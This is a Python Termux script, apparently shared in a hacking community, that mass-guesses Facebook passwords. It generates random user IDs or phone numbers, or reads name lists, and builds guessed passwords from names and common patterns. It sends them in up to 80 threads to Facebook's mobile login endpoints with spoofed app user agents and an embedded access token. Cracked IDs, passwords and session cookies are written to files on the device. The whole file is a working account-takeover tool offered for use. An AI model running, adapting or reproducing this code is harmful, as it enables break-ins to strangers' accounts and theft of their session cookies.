'''
   DEVOLOPER MR - EHC
--- FYLL UPDATED
--- GIVE CREDIT EHC TERMUX COMMUNITY 
'''
import os,sys,uuid,re,random,time,string,json

try:
    import requests,rich
except:
    os.system("pip3 install requests rich")
    import requests,rich

from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

version="v5"
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';W = '\x1b[38;5;196m';hh = '\033[34;1m'
class sort:
    def line():
        return "[b dark_sea_green2]="*37
        
    def clear():
        os.system("clear")
    
    def logo():
        aci=f'''
	[white]┏┓┓┏┏┓┏┓  ┏┓┏┓  ┓┏┏┓┏┓┓┏┓ 
	[white]┃┃┗┫ ┃┃ ━━┣ ┣ ━━┣┫┣┫┃ ┃┫
	[white]┣┛┗┛┗┛┗┛  ┻ ┻   ┛┗┛┗┗┛┛┗┛\n[red1]{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]EMON\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Always Free[/r]\n[red1]{sort.line()}'''
        print(aci)
    
    def color():
        co=['\x1b[1;93m','\x1b[1;91m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m']
        cx=random.choice(co)
        return cx


def info():
    sort.clear()
    print('     [b]    [red1] WELCOME TO BABAR DOROBAR          ')
    time.sleep(4)
    sort.clear()
    
#---------# Global
oks=[]
loop=0

def cont(li):
    if li <10:
        return "0"+str(li)
    else:
        return str(li)
#---------# Date
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"\x1b[1;97m."+month.get(today_data[1])
#---------#Old Date
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx

def samsung():
    anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["GT-I9505","SM-T835","SM-S901U","MMB29K","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
    vir=str(random.choice(range(111111111,999999999)))
    cho=str(random.choice(range(43,447)))
    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
    FBAN=fb.split("|")[1]
    platform=fb.split("|")[0]
    ua=f"Dalvik/2.1.0 (Linux; U; Android "+anderson+"; "+model+" Build/LRX22C) [FBAN/"+FBAN+";FBAV/"+cho+".0.0.15.89;FBPN/"+platform+";FBLC/sv_SE;FBBV/"+vir+";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/"+model+";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.choice(range(1,4)))+".0,width="+str(random.choice(range(720,1500)))+",height="+str(random.choice(range(1500,2000)))+"};FB_FW/1;]"
    return ua


#-----------#
def userag1():
    fb_v1=str(random.choice(range(111,555)))# "+fb_v1+"
    fb_v2=str(random.choice(range(111,555)))
    rdp1=str(random.choice(range(111111111,333333333)))# "+rdp1+"
    rdp2=str(random.choice(range(111111111,333333333)))
    andv=str(random.choice(range(8,12)))# "+andv+"
    # modorola
    ua="Dalvik/2.1.0 (Linux; U; Android "+andv+".0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/"+fb_v1+".0.0.50."+fb_v2+";FBPN/com.facebook.katana;FBLC/es_MX;FBBV/"+rdp1+";FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/"+andv+".0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]"
    
    
    return ua

def userag2():
    fb_v1=str(random.choice(range(111,555)))# "+fb_v1+"
    fb_v2=str(random.choice(range(111,555)))
    rdp1=str(random.choice(range(111111111,433333333)))# "+rdp1+"
    rdp2=str(random.choice(range(111111111,433333333)))
    andv=str(random.choice(range(8,12)))# "+andv+"
    #vivo
    ua="Dalvik/2.1.0 (Linux; U; Android "+andv+".1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/"+fb_v1+".0.0.16."+fb_v2+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+rdp1+";FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/"+andv+".1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"
    
    
    return ua



#-----------#


def old():
    user=[]
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]Crack 2011-14 Id")
    print("[b]    [red1][B] [spring_green1]Crack 2009-10 Id")
    print(sort.line())
    ask=input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    if ask in ["1","01","a","A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2011-14")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit=int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        star="10000"
        for i in range(limit):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2009-10")
        print(sort.line())
        print("  [b]   [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit=int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        
        for i in range(limit):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    print("[b]    [red1][1] [sea_green2]Method A")
    print("[b]    [red1][2] [spring_green1]Method B")
    print(sort.line())
    meth=input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    
    with ThreadPool(max_workers=40) as ehc:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]"+str(len(user)))
        print(" [b]    [red1]✗ [light_green]Login Ids [orange3]▶  [light_green]Just Now")
        print(sort.line())
        for mal in user:
            uid=star+mal
            ehc.submit(login,uid,meth)



def filee():
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]Crack Indian File")
    print("[b]    [red1][B] [spring_green1]Crack BD File")
    print(sort.line())
    ask=input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if ask in ["1","01","a","A"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND File Clone")
        print(sort.line())
        time.sleep(2)
        pwx=["07860786","57575751","57575752","57273200","59039200","first123","first 123","first1234","First123","First1234","first@123","first last","First Last","firstlast","firstlast123","firstlast1234","first@#","first@@","@first","@first@","first12"]
        
    elif ask in ["2","02","b","B"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD File Clone")
        print(sort.line())
        time.sleep(2)
        pwx=["first12","first123","first1234","first12345","first123456","firstlast","firstlast123","firstlast1234","first@123","first@","first@@","first@#","@first","@first@","firstlast12345","firstlast@#","firstlast@@","firstlast@","First123","First1234","first last","First Last","last123","Name","name","name123","Name","firstlast12","FirstLast123","FirstLast1234","FirstLast@#","FirstLast@@"]
        
    else:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
        print(sort.line())
        time.sleep(2)
        filee()
    print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]/sdcard/File.txt")
    path=str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
    
    print(sort.line())
    try:
        file=open(path,"r").read().splitlines()
    except:
        filee()
    print("[b]     [red1]✗ [chartreuse1]Add Pass  [orange3]▶  [chartreuse1](Y/n)")
    pa=str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
    if pa in ["y","Y","yes","Yes","1"]:
        pwx=[]
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Add Limit [orange3]▶  [chartreuse1]Example 10, 15, 20")
        lim=int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        for i in range(lim):
            i+=1
            print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]first123,firstlast")
            px=str(input(f"\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mPass  {cont(i)} \x1b[38;5;208m ▶ \x1b[38;0;196m "))
            print(sort.line())
            pwx.append(px)
    else:
       print(sort.line())
    print("[b]    [red1][1] [sea_green2]Method A")
    print("[b]    [red1][2] [spring_green1]Method B")
    print(sort.line())
    meth=input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    
    with ThreadPool(max_workers=80) as ehc:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]"+str(len(file)))
        print(" [b]    [red1]✗ [light_green]Method    [orange3]▶  [light_green]M"+meth)
        print(sort.line())
        for mal in file:
            try:
                uid=mal.split("|")[0]
                name=mal.split("|")[1]
                ehc.submit(file_sub,uid,pwx,name,meth,file)
            except:pass



def file_sub(uid,pwx,name,meth,file):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop/len(file))}\033[38;5;46m] \r")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        for pw in pwx:
            ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
            
            if meth in ["1","01","A","a"]:
                agent=userag1()
            else:
                agent=userag2()
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url1= 'https://b-graph.facebook.com/auth/login'
            po = Session.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            
            if "session_key" in po:
                oks.append(uid)
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][EMRAN-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/EMRAN_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][EMRAN-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/EMRAN_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            else:continue 
        loop+=1
    except:
        
        time.sleep(30)


def ran():
    user=[]
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]IND Number Clone")
    print("[b]    [red1][B] [spring_green1]BD Number Clone")
    print(sort.line())
    ask=input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if ask in ["1","01","a","A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND Number")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]+91629, +91701")
        code=str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit=int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        
        for i in range(limit):
            data=str(random.choice(range(1000000,9999999)))
            user.append(data)
    else:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]017, 018, 019")
        code=str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit=int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        
        for i in range(limit):
            data=str(random.choice(range(10000000,99999999)))
            user.append(data)
    print("[b]    [red1][1] [sea_green2]Method A")
    print("[b]    [red1][2] [spring_green1]Method B")
    print(sort.line())
    meth=input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    
    with ThreadPool(max_workers=70) as ehc:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]"+str(len(user)))
        print(f" [b]    [red1]✗ [light_green]Cod/Met   [orange3]▶  [light_green]{code}/M"+meth)
        print(sort.line())
        for xd in user:
            uid=code+xd
            if ask in ["1","01","a","A"]:
                pwx=["57575751","57575752","57273200","59039200","07860786",uid,xd,xd[1:]]
            else:
                pwx=[uid,uid[:6],uid[:7],uid[:8],xd,xd[1:],xd[2:]]
            ehc.submit(ren_sub,uid,pwx,meth,user)


def ren_sub(uid,pwx,meth,user):
    global oks,loop
    try:
        Session=requests.session()
        sys.stdout.write(f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop/len(user))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for ps in pwx:
            
            if meth in ["1","01","A","a"]:
                
                agent=userag1()
            else:
                
                agent=userag2()
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': agent,
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            po = Session.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            if "session_key" in po:
                uid=po["uid"]
                oks.append(uid)
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][EMRAN-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/EMRAN_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                uid=po["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][EMRAN-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/EMRAN_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            else:continue
        loop+=1
    except:time.sleep(30)




def main():
    info()
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [chartreuse1]File Clone [blue][[green]B[red1]D[blue]-[orange1]I[white]N[bright_green]D[blue]]")
    print("[b]    [red1][B] [spring_green2]Old Uid Clone")
    print("[b]    [red1][C] [spring_green1]Random (more..2)")
    
    print(sort.line())
    fast_choice=input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if fast_choice in ["1","01","a","A"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]File Clone")
        print(sort.line())
        time.sleep(2)
        filee()
    elif fast_choice in ["2","02","b","B"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Old Uid Crack")
        print(sort.line())
        time.sleep(2)
        old()
    elif fast_choice in ["3","03","c","C"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Random Crack")
        print(sort.line())
        time.sleep(2)
        ran()
    else:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
        print(sort.line())
        time.sleep(2)
        main()


def login(uid,meth):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}EMRAN-PYX-FF-HACK\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789"]:
            if meth in ["1","01","A","a"]:
                agent=ua()
            else:
                agent=samsung()
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": agent, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                oks.append(uid)
                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/EMRAN_old.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(rp):
                oks.append(uid)
                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/EMRAN_old.txt","a").write(uid+"|"+pw+"\n")
                break
            
            else:continue
        loop+=1
    except:
        time.sleep(30)



main()